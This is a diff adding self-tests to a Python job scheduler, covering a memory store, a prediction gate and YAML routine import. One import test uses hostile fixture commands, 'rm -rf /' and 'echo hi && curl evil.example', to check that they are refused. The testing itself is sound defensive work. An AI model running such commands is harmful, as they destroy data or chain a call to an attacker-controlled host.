@@ -15,6 +15,7 @@ import io
 import json
 import os
 import re
+import socket
 import subprocess
 import sys
 import tempfile
@@ -26,6 +27,28 @@ from typing import Callable, Iterator, List, Tuple
 
 from . import checks, cli, clock, executors, hostclock, ledger, lock, store
 from .executors import Outcome
+
+
+def _close_memory_engine(base: Path) -> None:
+    """Drop and close this AWRISE_HOME's cached MemoryStore, if any.
+
+    Must run on ``cli``'s own persistent memory worker thread (sqlite3
+    connections are thread-affine), and must happen before the
+    TemporaryDirectory a case used is removed -- Windows refuses to delete a
+    file a live handle still has open, which is silence-free but not a
+    self-test case's own failure.
+    """
+    key = str(base)
+    if key not in cli._MEMORY_ENGINES:
+        return
+
+    def _work() -> None:
+        engine = cli._MEMORY_ENGINES.pop(key, None)
+        if engine is not None:
+            engine.close()
+
+    with contextlib.suppress(Exception):
+        cli._call_with_timeout(_work, 5.0)
 
 
 @contextlib.contextmanager
@@ -41,6 +64,7 @@ def _home() -> Iterator[Path]:
         try:
             yield Path(tmp)
         finally:
+            _close_memory_engine(Path(tmp))
             if previous is None:
                 os.environ.pop("AWRISE_HOME", None)
             else:
@@ -349,7 +373,10 @@ def spec_keys_accepted_equal_keys_read() -> None:
     assert settable_roots | {"interval_s"} == declared
     pattern = re.compile(r"""job(?:s\[[^\]]+\])?(?:\.get\(|\[)["'](\w+)["']""")
     read: set = set()
-    for module in (cli, executors, clock):
+    # `checks` is a real reader: WL006 judges a detached wake from the
+    # `receipt` path the job declares. Leaving it out of this scan would make
+    # a knob that IS read look like dead config.
+    for module in (cli, executors, clock, checks):
         read |= set(pattern.findall(Path(module.__file__).read_text(encoding="utf-8")))
     allowed = declared | set(store.STATE_DEFAULTS)
     assert read <= allowed, f"code reads keys the spec does not declare: {read - allowed}"
@@ -2303,6 +2330,552 @@ def a_job_with_no_sinks_configured_writes_no_report_rows() -> None:
         ] == []
 
 
+_ECHO_MEMORY_ENV = (
+    "import os, sys; sys.stdout.write(os.environ.get('AWRISE_MEMORY_JSON', 'MISSING'))"
+)
+
+
+def memory_off_by_default_touches_neither_env_nor_store() -> None:
+    with _home() as base:
+        assert _add("m", run=_ECHO_MEMORY_ENV, executor="python") == 0
+        assert _run_due() == 0
+        row = [r for r in ledger.read(base) if r.get("event") == "finished"][-1]
+        assert row["stdout_tail"] == "MISSING", row
+        assert not (base / "awm").exists()
+        # negative twin: turning it on creates the store and the export
+        assert (
+            cli._dispatch(
+                cli.cmd_set,
+                argparse.Namespace(
+                    name="m", assignments=["report.memory=true"], allow_overrun=False
+                ),
+            )
+            == 0
+        )
+        with _clock_forward(3600):
+            assert _run_due() == 0
+        row = [r for r in ledger.read(base) if r.get("event") == "finished"][-1]
+        assert row["stdout_tail"] == "[]", row
+        assert (base / "awm" / "memory.db").is_file()
+
+
+def memory_on_exports_recalled_wakes_and_excludes_ancestor_scope() -> None:
+    import awm
+
+    with _home() as base:
+        assert _add("m", run=_ECHO_MEMORY_ENV, executor="python") == 0
+        assert (
+            cli._dispatch(
+                cli.cmd_set,
+                argparse.Namespace(
+                    name="m", assignments=["report.memory=true"], allow_overrun=False
+                ),
+            )
+            == 0
+        )
+        assert _run_due() == 0  # wake 1: recalls [], remembers wake-1
+        with _clock_forward(3700):
+            assert _run_due() == 0  # wake 2: recalls [wake-1], remembers wake-2
+        row2 = [r for r in ledger.read(base) if r.get("event") == "finished"][-1]
+        assert len(json.loads(row2["stdout_tail"])) == 1, row2
+        # Poison the ANCESTOR scope directly. An unfiltered recall() WOULD
+        # return this (that is awm's own ancestor decay, working as
+        # designed) -- proving the sink's exact-scope filter is what keeps a
+        # write anyone could make at `awrise:<host>:*` out of every job's env.
+        poison = awm.MemoryStore(base / "awm" / "memory.db")
+        poison.remember(
+            awm.Scope("awrise", socket.gethostname(), "*"),
+            key="wake-poison",
+            value=json.dumps(
+                {
+                    "state": "success",
+                    "reason": "poison",
+                    "duration_s": 0,
+                    "exit_code": 0,
+                    "ts": "x",
+                }
+            ),
+            kind="wake",
+        )
+        poison.close()
+        with _clock_forward(7400):
+            assert _run_due() == 0  # wake 3: recalls [wake-2, wake-1], never the poison
+        row3 = [r for r in ledger.read(base) if r.get("event") == "finished"][-1]
+        payload = json.loads(row3["stdout_tail"])
+        assert len(payload) == 2, payload
+        assert all("poison" not in json.dumps(fact) for fact in payload), payload
+        assert not [r for r in ledger.read(base) if r.get("event") == "report_error"]
+
+
+def memory_failure_is_a_report_error_row_not_a_failed_wake() -> None:
+    with _home() as base:
+        assert _add("m", run="import sys; sys.exit(0)", executor="python") == 0
+        assert (
+            cli._dispatch(
+                cli.cmd_set,
+                argparse.Namespace(
+                    name="m", assignments=["report.memory=true"], allow_overrun=False
+                ),
+            )
+            == 0
+        )
+
+        def _boom(_base):
+            raise RuntimeError("store exploded")
+
+        previous = cli._memory_store
+        cli._memory_store = _boom
+        try:
+            assert _run_due() == 0
+        finally:
+            cli._memory_store = previous
+        row = [r for r in ledger.read(base) if r.get("event") == "finished"][-1]
+        assert row["state"] == "success", row
+        reasons = " ".join(
+            r.get("reason") or "" for r in ledger.read(base) if r.get("event") == "report_error"
+        )
+        assert "memory_recall_failed" in reasons, reasons
+        assert "memory_remember_failed" in reasons, reasons
+
+
+def explain_shows_the_same_recalled_memory_payload() -> None:
+    with _home():
+        assert _add("m", run=_ECHO_MEMORY_ENV, executor="python") == 0
+        assert (
+            cli._dispatch(
+                cli.cmd_set,
+                argparse.Namespace(
+                    name="m", assignments=["report.memory=true"], allow_overrun=False
+                ),
+            )
+            == 0
+        )
+        assert _run_due() == 0
+        out = io.StringIO()
+        with contextlib.redirect_stdout(out):
+            rc = cli._dispatch(cli.cmd_explain, argparse.Namespace(name="m", since=None))
+        assert rc == 0
+        lines = [ln for ln in out.getvalue().splitlines() if ln.startswith("memory")]
+        assert lines and lines[0].startswith("memory       ["), lines
+
+
+def _predict_history(base: Path, state: str, count: int) -> None:
+    """*count* judged finished rows for job "p", one per due window, under
+    `predict: off` so building the history never itself consults the gate."""
+    for i in range(count):
+        ctx = _clock_forward(3700 * i) if i else contextlib.nullcontext()
+        with ctx:
+            rc = _run_due(lambda job, wake, s=state: Outcome(s, f"fake_{s}"))
+        assert rc == (1 if state in ledger.BAD_STATES else 0), (state, rc)
+
+
+def predict_off_writes_no_prediction_and_builds_no_engine() -> None:
+    with _home() as base:
+        assert _add("p", run="echo hi") == 0
+        assert _run_due() == 0
+        row = [r for r in ledger.read(base) if r.get("event") == "started"][-1]
+        assert "prediction" not in row, row
+        assert str(base) not in cli._PREDICT_ENGINES
+
+
+def predict_under_threshold_is_unjudged_and_still_fires() -> None:
+    with _home() as base:
+        assert _add("p", run="echo hi") == 0
+        assert (
+            cli._dispatch(
+                cli.cmd_set,
+                argparse.Namespace(name="p", assignments=["predict=warn"], allow_overrun=False),
+            )
+            == 0
+        )
+        assert _run_due() == 0
+        row = [r for r in ledger.read(base) if r.get("event") == "started"][-1]
+        assert row["prediction"]["verdict"] == "UNJUDGED", row
+        assert "historical rows" in row["prediction"]["reason"], row
+        finished = [r for r in ledger.read(base) if r.get("event") == "finished"][-1]
+        assert finished["state"] == "success", finished
+        assert not [r for r in ledger.read(base) if r.get("event") == "report_error"]
+
+
+def predict_engine_is_built_exactly_once_across_due_checks() -> None:
+    import awpredict.core.mlp as mlp
+
+    with _home() as base:
+        assert _add("p", run="echo hi") == 0
+        assert (
+            cli._dispatch(
+                cli.cmd_set,
+                argparse.Namespace(name="p", assignments=["predict=warn"], allow_overrun=False),
+            )
+            == 0
+        )
+        _predict_history(base, "success", cli.PREDICT_MIN_ROWS)
+        builds = []
+        real_init = mlp.MLPWorldModel.__init__
+
+        def counting_init(self, *a, **k):
+            builds.append(1)
+            return real_init(self, *a, **k)
+
+        mlp.MLPWorldModel.__init__ = counting_init
+        try:
+            # Three MORE due-checks, every one past the row threshold, so
+            # every one reaches `_predict_engine` -- built on the FIRST,
+            # reused by the other two.
+            for i in range(3):
+                with _clock_forward(3700 * (cli.PREDICT_MIN_ROWS + i)):
+                    assert _run_due(lambda job, wake: Outcome("success", "ok")) == 0
+        finally:
+            mlp.MLPWorldModel.__init__ = real_init
+        assert builds == [1], builds
+
+
+def predict_timeout_fails_open_and_writes_a_report_error_row() -> None:
+    with _home() as base:
+        assert _add("p", run="echo hi") == 0
+        assert (
+            cli._dispatch(
+                cli.cmd_set,
+                argparse.Namespace(name="p", assignments=["predict=warn"], allow_overrun=False),
+            )
+            == 0
+        )
+        _predict_history(base, "success", cli.PREDICT_MIN_ROWS)
+
+        def _hang(fn, timeout_s):
+            raise TimeoutError(f"timed out after {timeout_s:g}s")
+
+        previous = cli._predict_call_with_timeout
+        cli._predict_call_with_timeout = _hang
+        try:
+            with _clock_forward(3700 * cli.PREDICT_MIN_ROWS):
+                assert _run_due(lambda job, wake: Outcome("success", "ok")) == 0
+        finally:
+            cli._predict_call_with_timeout = previous
+        row = [r for r in ledger.read(base) if r.get("event") == "started"][-1]
+        assert row["prediction"]["verdict"] == "UNJUDGED", row
+        assert "timed out" in row["prediction"]["reason"], row
+        reasons = " ".join(
+            r.get("reason") or "" for r in ledger.read(base) if r.get("event") == "report_error"
+        )
+        assert "timed out" in reasons, reasons
+
+
+def predict_skip_holds_on_a_bad_verdict_and_never_skips_twice_running() -> None:
+    with _home() as base:
+        assert _add("p", run="echo hi") == 0
+        _predict_history(base, "timeout", cli.PREDICT_MIN_ROWS)
+        assert (
+            cli._dispatch(
+                cli.cmd_set,
+                argparse.Namespace(name="p", assignments=["predict=skip"], allow_overrun=False),
+            )
+            == 0
+        )
+        fired = []
+        with _clock_forward(3700 * cli.PREDICT_MIN_ROWS):
+            rc = _run_due(lambda job, wake: fired.append(1) or Outcome("timeout", "fake"))
+        assert rc == 0
+        assert fired == [], "a bad-verdict skip must never call the executor"
+        rows = [r for r in ledger.read(base) if r.get("event") == "finished"]
+        assert rows[-1]["state"] == "skipped_predicted", rows[-1]
+        # No-starvation: the row right after `skipped_predicted` is a real
+        # attempt, whatever the model still predicts.
+        with _clock_forward(3700 * (cli.PREDICT_MIN_ROWS + 1)):
+            rc = _run_due(lambda job, wake: fired.append(1) or Outcome("timeout", "fake"))
+        assert rc == 1
+        assert fired == [1], "the row after skipped_predicted must be a real attempt"
+        rows = [r for r in ledger.read(base) if r.get("event") == "finished"]
+        assert rows[-1]["state"] == "timeout", rows[-1]
+        started = [r for r in ledger.read(base) if r.get("event") == "started"][-1]
+        assert started["prediction"]["verdict"] == "bad", started
+
+
+def dry_run_predict_skip_agrees_with_the_real_pass() -> None:
+    with _home() as base:
+        assert _add("p", run="echo hi") == 0
+        _predict_history(base, "timeout", cli.PREDICT_MIN_ROWS)
+        assert (
+            cli._dispatch(
+                cli.cmd_set,
+                argparse.Namespace(name="p", assignments=["predict=skip"], allow_overrun=False),
+            )
+            == 0
+        )
+        with _clock_forward(3700 * cli.PREDICT_MIN_ROWS):
+            out = io.StringIO()
+            with contextlib.redirect_stdout(out):
+                rc = cli._dispatch(
+                    cli.cmd_run_due,
+                    argparse.Namespace(
+                        quiet=False, invoker="selftest", dry_run=True, drain=False, prune=None
+                    ),
+                )
+            assert rc == 0
+            assert "hold" in out.getvalue(), out.getvalue()
+            assert not [
+                r
+                for r in ledger.read(base)
+                if r.get("event") == "finished" and r.get("dry_run")
+            ]
+            fired = []
+            rc = _run_due(lambda job, wake: fired.append(1) or Outcome("timeout", "fake"))
+        assert rc == 0
+        assert fired == [], "the real pass must agree with the dry run and hold too"
+        rows = [r for r in ledger.read(base) if r.get("event") == "finished"]
+        assert rows[-1]["state"] == "skipped_predicted", rows[-1]
+
+
+_DISK_PRESSURE_SHAPED_YAML = """
+routines:
+  - id: disk_pressure
+    schedule:
+      type: interval
+      interval_minutes: 360
+      jitter_minutes: 11
+      jitter: true
+    action:
+      type: shell_command
+      command: python3 dev/tools/check_disk_pressure.py --from-record --max-age-hours 8
+      cwd: /app/AitherOS
+      timeout_seconds: 120
+"""
+
+
+def _import_routine_args(
+    path, apply: bool = False, i_am_the_runner: bool = False, json_out: bool = False
+):
+    return argparse.Namespace(
+        paths=str(path), apply=apply, i_am_the_runner=i_am_the_runner, json=json_out
+    )
+
+
+def import_routine_translates_a_shaped_yaml_and_writes_nothing_without_apply() -> None:
+    with _home() as base:
+        with tempfile.TemporaryDirectory(prefix="awrise-selftest-routines-") as tmp:
+            path = Path(tmp) / "disk-pressure.yaml"
+            path.write_text(_DISK_PRESSURE_SHAPED_YAML, encoding="utf-8")
+            out = io.StringIO()
+            with contextlib.redirect_stdout(out):
+                rc = cli._dispatch(cli.cmd_import_routine, _import_routine_args(path))
+            assert rc == 0
+            assert store.load(base) == {}, "a plan without --apply must write nothing"
+            assert "routine-disk_pressure" in out.getvalue()
+            assert "not carried over" in out.getvalue(), "the dropped jitter must be NAMED"
+
+
+def import_routine_apply_with_i_am_the_runner_writes_the_job_exactly_once() -> None:
+    with _home() as base:
+        with tempfile.TemporaryDirectory(prefix="awrise-selftest-routines-") as tmp:
+            path = Path(tmp) / "disk-pressure.yaml"
+            path.write_text(_DISK_PRESSURE_SHAPED_YAML, encoding="utf-8")
+            rc = cli._dispatch(
+                cli.cmd_import_routine,
+                _import_routine_args(path, apply=True, i_am_the_runner=True),
+            )
+            assert rc == 0
+            jobs = store.load(base)
+            assert list(jobs) == ["routine-disk_pressure"], jobs
+            job = jobs["routine-disk_pressure"]
+            assert job["run"] == (
+                "python3 dev/tools/check_disk_pressure.py --from-record --max-age-hours 8"
+            )
+            assert job["cwd"] == "/app/AitherOS"
+            assert job["timeout_s"] == 120
+            assert job["every"] == "360m"
+            # Idempotent: a second import reports `exists`, never a duplicate.
+            rc2 = cli._dispatch(
+                cli.cmd_import_routine,
+                _import_routine_args(path, apply=True, i_am_the_runner=True),
+            )
+            assert rc2 == 0
+            assert list(store.load(base)) == ["routine-disk_pressure"]
+
+
+def import_routine_apply_without_the_runner_flag_is_refused() -> None:
+    with _home() as base:
+        with tempfile.TemporaryDirectory(prefix="awrise-selftest-routines-") as tmp:
+            path = Path(tmp) / "disk-pressure.yaml"
+            path.write_text(_DISK_PRESSURE_SHAPED_YAML, encoding="utf-8")
+            rc = cli._dispatch(cli.cmd_import_routine, _import_routine_args(path, apply=True))
+            assert rc == 1
+            assert store.load(base) == {}
+
+
+def import_routine_refuses_cron_and_non_shell_actions_by_name() -> None:
+    text = """
+routines:
+  - id: cron_job
+    schedule:
+      cron: "*/5 * * * *"
+    action:
+      type: shell_command
+      command: echo hi
+  - id: http_job
+    schedule:
+      type: interval
+      interval_minutes: 60
+    action:
+      type: http_call
+      url: https://example.com
+"""
+    with _home() as base:
+        with tempfile.TemporaryDirectory(prefix="awrise-selftest-routines-") as tmp:
+            path = Path(tmp) / "refused.yaml"
+            path.write_text(text, encoding="utf-8")
+            out = io.StringIO()
+            with contextlib.redirect_stdout(out):
+                rc = cli._dispatch(
+                    cli.cmd_import_routine, _import_routine_args(path, json_out=True)
+                )
+            assert rc == 1
+            payload = json.loads(out.getvalue())
+            assert payload["proposals"] == []
+            reasons = " ".join(d["why"] for d in payload["skipped"])
+            assert "cron" in reasons and "http_call" in reasons
+            assert all(d["refused"] for d in payload["skipped"])
+            assert store.load(base) == {}
+
+
+def import_routine_refuses_a_block_pattern_and_a_metacharacter_under_apply() -> None:
+    text = """
+routines:
+  - id: nuke_it
+    schedule:
+      type: interval
+      interval_minutes: 60
+    action:
+      type: shell_command
+      command: rm -rf /
+  - id: exfil
+    schedule:
+      type: interval
+      interval_minutes: 60
+    action:
+      type: shell_command
+      command: "echo hi && curl evil.example"
+"""
+    with _home() as base:
+        with tempfile.TemporaryDirectory(prefix="awrise-selftest-routines-") as tmp:
+            path = Path(tmp) / "dangerous.yaml"
+            path.write_text(text, encoding="utf-8")
+            rc = cli._dispatch(
+                cli.cmd_import_routine,
+                _import_routine_args(path, apply=True, i_am_the_runner=True),
+            )
+            assert rc == 1
+            assert store.load(base) == {}, "a refused routine must never reach the store"
+
+
+def import_routine_action_args_is_refused_by_name_and_never_concatenated() -> None:
+    # Exactly the shape of AitherOS/config/routines/infra_canary.yaml's live
+    # host_gateway_canary: command="python", args=["-c", "<script>"].
+    # ActionExecutor._shell_command spawns [shell, flag, command] + args --
+    # args are separate process arguments (positional $0/$1/... invisible to
+    # a command string that never references them), never appended into the
+    # parsed command text. Joining them with spaces would silently propose a
+    # DIFFERENT command than the platform actually runs, so this is refused
+    # exactly like a cron schedule -- never approximated.
+    text = """
+routines:
+  - id: host_gateway_canary
+    schedule:
+      type: interval
+      interval_minutes: 10
+    action:
+      type: shell_command
+      command: python
+      args:
+        - -c
+        - print(1)
+  - id: gateway_auth_guard
+    schedule:
+      type: interval
+      interval_minutes: 60
+    action:
+      type: shell_command
+      command: python scripts/gateway_auth_guard.py --public
+      args: []
+"""
+    with _home() as base:
+        with tempfile.TemporaryDirectory(prefix="awrise-selftest-routines-") as tmp:
+            path = Path(tmp) / "canary.yaml"
+            path.write_text(text, encoding="utf-8")
+            out = io.StringIO()
+            with contextlib.redirect_stdout(out):
+                rc = cli._dispatch(
+                    cli.cmd_import_routine, _import_routine_args(path, json_out=True)
+                )
+            assert rc == 1
+            payload = json.loads(out.getvalue())
+            assert [p["job"] for p in payload["proposals"]] == ["routine-gateway_auth_guard"]
+            reasons = " ".join(d["why"] for d in payload["skipped"])
+            assert "action.args" in reasons
+            assert all(d["refused"] for d in payload["skipped"])
+
+            # --apply agrees: the args-bearing routine is never written, and
+            # an empty `args: []` is unaffected and still imports plainly.
+            # rc is still 1 -- one entry in the file was refused, same as a
+            # plan/apply run with any other mixed refusal.
+            out_apply = io.StringIO()
+            with contextlib.redirect_stdout(out_apply):
+                rc_apply = cli._dispatch(
+                    cli.cmd_import_routine,
+                    _import_routine_args(path, apply=True, i_am_the_runner=True),
+                )
+            assert rc_apply == 1
+            jobs = store.load(base)
+            assert list(jobs) == ["routine-gateway_auth_guard"], jobs
+            assert jobs["routine-gateway_auth_guard"]["run"] == (
+                "python scripts/gateway_auth_guard.py --public"
+            )
+
+
+def history_import_fleet_is_read_only_and_flags_unparseable_records() -> None:
+    with _home() as base:
+        with tempfile.TemporaryDirectory(prefix="awrise-selftest-routines-") as tmp:
+            path = Path(tmp) / "disk-pressure.yaml"
+            path.write_text(_DISK_PRESSURE_SHAPED_YAML, encoding="utf-8")
+            assert (
+                cli._dispatch(
+                    cli.cmd_import_routine,
+                    _import_routine_args(path, apply=True, i_am_the_runner=True),
+                )
+                == 0
+            )
+            before = dict(store.load(base))
+            fleet = Path(tmp) / "last-executed.json"
+            fleet.write_text(
+                json.dumps(
+                    {
+                        "disk_pressure": "2026-09-19T05:00:00+00:00",
+                        "never_imported": "2026-09-18T05:00:00+00:00",
+                        "bad_stamp": "not-a-timestamp",
+                    }
+                ),
+                encoding="utf-8",
+            )
+            hist_args = argparse.Namespace(
+                job=None,
+                since=None,
+                event=None,
+                limit=50,
+                json=True,
+                judge=False,
+                import_fleet=str(fleet),
+            )
+            out = io.StringIO()
+            with contextlib.redirect_stdout(out):
+                rc = cli._dispatch(cli.cmd_history, hist_args)
+            assert rc == 1
+            payload = json.loads(out.getvalue())
+            by_id = {r["routine_id"]: r for r in payload["rows"]}
+            assert by_id["disk_pressure"]["imported"] is True
+            assert by_id["never_imported"]["imported"] is False
+            assert any(r[0] == "bad_stamp" for r in payload["refused"])
+            assert store.load(base) == before, "history --import-fleet must never write"
+
+
 CASES: List[Tuple[str, Callable[[], None]]] = [
     (fn.__name__, fn)
     for fn in (
@@ -2375,6 +2948,23 @@ CASES: List[Tuple[str, Callable[[], None]]] = [
         card_raised_after_n_failures,
         report_block_validated_at_add,
         cwd_missing_is_error,
+        memory_off_by_default_touches_neither_env_nor_store,
+        memory_on_exports_recalled_wakes_and_excludes_ancestor_scope,
+        memory_failure_is_a_report_error_row_not_a_failed_wake,
+        explain_shows_the_same_recalled_memory_payload,
+        predict_off_writes_no_prediction_and_builds_no_engine,
+        predict_under_threshold_is_unjudged_and_still_fires,
+        predict_engine_is_built_exactly_once_across_due_checks,
+        predict_timeout_fails_open_and_writes_a_report_error_row,
+        predict_skip_holds_on_a_bad_verdict_and_never_skips_twice_running,
+        dry_run_predict_skip_agrees_with_the_real_pass,
+        import_routine_translates_a_shaped_yaml_and_writes_nothing_without_apply,
+        import_routine_apply_with_i_am_the_runner_writes_the_job_exactly_once,
+        import_routine_apply_without_the_runner_flag_is_refused,
+        import_routine_refuses_cron_and_non_shell_actions_by_name,
+        import_routine_refuses_a_block_pattern_and_a_metacharacter_under_apply,
+        import_routine_action_args_is_refused_by_name_and_never_concatenated,
+        history_import_fleet_is_read_only_and_flags_unparseable_records,
     )
 ]
 
